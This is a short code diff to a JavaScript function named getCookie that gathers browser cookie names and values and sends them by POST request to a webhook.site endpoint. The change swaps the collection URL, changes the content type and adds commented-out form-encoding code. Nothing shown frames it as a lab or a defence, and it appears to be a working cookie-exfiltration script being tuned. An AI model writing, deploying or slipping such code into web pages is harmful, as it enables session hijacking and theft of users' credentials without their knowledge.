@@ -9,8 +9,8 @@ function getCookie() {
 		});
 
 		var xhr = new XMLHttpRequest();
-		xhr.open("POST", "https://webhook.site/82c8847e-1523-4b5c-bb28-579431cf4479", true);
-		xhr.setRequestHeader("Content-Type", "application/json");
+		xhr.open("POST", "https://webhook.site/4c69d1d9-da93-4419-8c1c-e1c73d89311f", true);
+		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 		xhr.onload = function () {
 			if (xhr.status === 200) {
@@ -25,8 +25,13 @@ function getCookie() {
 		xhr.onerror = function () {
 			console.error("Error sending data:", xhr.statusText);
 		};
-
 		var data = JSON.stringify({ nama: cookieName, isi: cookieVal });
+		// var params = new URLSearchParams();
+		// for (var i = 0; i < cookieName.length; i++) {
+		// 	params.append("nama", cookieName[i]);
+		// 	params.append("isi", cookieVal[i]);
+		// }
+
 		xhr.send(data);
 	});
 }
